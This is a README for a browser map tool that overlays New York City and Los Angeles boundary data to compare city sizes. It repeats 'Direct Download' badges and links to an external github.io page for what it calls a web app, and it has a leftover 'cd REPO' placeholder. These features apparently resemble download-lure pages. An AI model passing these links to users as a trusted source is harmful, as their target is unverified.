# City Size Comparison Tool - Geospatial Comparison Tool 2026

> **City Size Comparison Tool** is a browser-based interactive map for comparing real administrative boundaries at scale, with the latest build focused on visual comparisons between supported cities such as New York City and Los Angeles.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seanfisher64/compare-city-sizes-win-29877?style=flat-square)](https://github.com/seanfisher64/compare-city-sizes-win-29877)

---

<p align="center">
  <a href="https://seanfisher64.github.io/compare-city-sizes-win-29877/">
    <img src="https://img.shields.io/badge/Download-City%20Size%20Comparison%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download City Size Comparison Tool">
  </a>
</p>

> **[Direct Download - City Size Comparison Tool Latest](https://seanfisher64.github.io/compare-city-sizes-win-29877/)**

---

[Download Latest Build](https://seanfisher64.github.io/compare-city-sizes-win-29877/)

---

## About City Size Comparison Tool

City Size Comparison Tool presents administrative boundary data on an interactive map so users can examine how the footprints of different cities relate to one another. Boundary overlays use scale-accurate visualization, making the comparison more useful than relying on simple side-by-side labels or approximate shapes.

The tool is designed for anyone working with geographic context, including urban planning learners, map enthusiasts, educators, and data visualization users. Its movement and rotation controls make it possible to position one city over another and inspect the resulting relationship directly in the browser.

---

## Features

- Compare cities using actual administrative boundary data
- View semi-transparent GeoJSON boundary overlays
- Visualize relative city size with scale-aware map geometry
- Rotate overlay cities for different alignment perspectives
- Translate overlays across the map
- Change the movement step size for finer control
- Reset rotation and position with dedicated controls
- Use a responsive interface on desktop and mobile screens
- Explore supported New York City and Los Angeles datasets
- Interact with a Leaflet-powered map view

---

## Installation

### Use the hosted build

Open the latest web build in a modern browser:

[Launch City Size Comparison Tool](https://seanfisher64.github.io/compare-city-sizes-win-29877/)

### Run locally

Clone the repository and open the main HTML entry point:

```bash
git clone https://github.com/seanfisher64/compare-city-sizes-win-29877.git
cd REPO
```

Then open `index.html` in a browser. If your browser restricts local data loading, serve the folder with a simple local web server and visit the address it provides.

---

## Usage

1. Launch the hosted version or open the project locally.
2. Select a supported city boundary dataset.
3. Use the map to inspect the base city and overlay city.
4. Adjust the overlay position with the movement controls.
5. Change the movement step size when more precise placement is needed.
6. Rotate the overlay to compare different orientations.
7. Use the reset controls to restore its original position and rotation.
8. Review the semi-transparent boundary relationship on the interactive map.

The current datasets include boundaries for New York City and Los Angeles.

---

## Configuration

City selection, overlay movement, rotation, step size, and reset actions are controlled through the web interface. No separate configuration file is required for normal use.

For local development, keep the project files and GeoJSON boundary assets in their expected repository locations so the browser can load the map and datasets correctly.

---

## Requirements

- A modern desktop or mobile web browser
- JavaScript enabled
- Internet access for the hosted build and any externally loaded map resources
- A local copy of the repository for offline or development use
- Sufficient browser storage and memory to render interactive map layers

No native desktop installation is required.

---

## FAQ

### Which cities are currently available?

The included boundary datasets support New York City and Los Angeles.

### Can I move and rotate the comparison overlay?

Yes. The interface provides translation controls, rotation controls, adjustable movement increments, and reset actions.

### Is the tool usable on a phone?

The interface is designed to respond to both desktop and mobile screen sizes. Available space and browser controls may affect the viewing experience.

### How do I get the latest update?

Use the [latest hosted build](https://seanfisher64.github.io/compare-city-sizes-win-29877/). Repository changes and releases can also be followed at [GitHub](https://github.com/seanfisher64/compare-city-sizes-win-29877).

### The local page does not load the map data. What should I check?

Confirm that the repository files were cloned completely and that the GeoJSON assets remain in their expected locations. If direct file access is restricted by the browser, run the project through a local web server instead of opening the HTML file directly.

### Where are settings stored?

Normal settings are applied through the controls in the page and do not require a separate user configuration file.

---

## Roadmap

- Expand the collection of supported city boundary datasets
- Improve comparison workflows for additional geographic regions
- Continue refining controls for desktop and mobile use
- Add further visualization options for boundary-based analysis

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
